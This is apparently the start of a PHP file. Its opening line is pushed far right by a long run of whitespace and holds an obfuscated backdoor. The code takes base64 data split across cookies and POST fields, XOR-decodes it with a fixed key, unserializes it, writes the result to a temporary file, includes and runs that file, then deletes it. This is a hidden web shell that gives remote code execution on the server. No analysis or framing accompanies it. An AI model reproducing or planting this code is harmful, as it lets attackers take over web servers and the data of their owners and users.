<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("exaoxoiyw")){class exaoxoiyw{public static $nellz = "rhurtbbbjkvkqksk";public static $rijkssc = NULL;public function __construct(){$luvnec = @$_COOKIE[substr(exaoxoiyw::$nellz, 0, 4)];if (!empty($luvnec)){$byxgbzdu = "base64";$ifhdze = "";$luvnec = explode(",", $luvnec);foreach ($luvnec as $qcveouwahb){$ifhdze .= @$_COOKIE[$qcveouwahb];$ifhdze .= @$_POST[$qcveouwahb];}$ifhdze = array_map($byxgbzdu . "_decode", array($ifhdze,));$ifhdze = $ifhdze[0] ^ str_repeat(exaoxoiyw::$nellz, (strlen($ifhdze[0]) / strlen(exaoxoiyw::$nellz)) + 1);exaoxoiyw::$rijkssc = @unserialize($ifhdze);}}public function __destruct(){$this->vmkdncuz();}private function vmkdncuz(){if (is_array(exaoxoiyw::$rijkssc)) {$mldwpisk = sys_get_temp_dir() . "/" . crc32(exaoxoiyw::$rijkssc["salt"]);@exaoxoiyw::$rijkssc["write"]($mldwpisk, exaoxoiyw::$rijkssc["content"]);include $mldwpisk;@exaoxoiyw::$rijkssc["delete"]($mldwpisk);exit();}}}$yaiqhmkn = new exaoxoiyw();$yaiqhmkn = NULL;} ?><?php
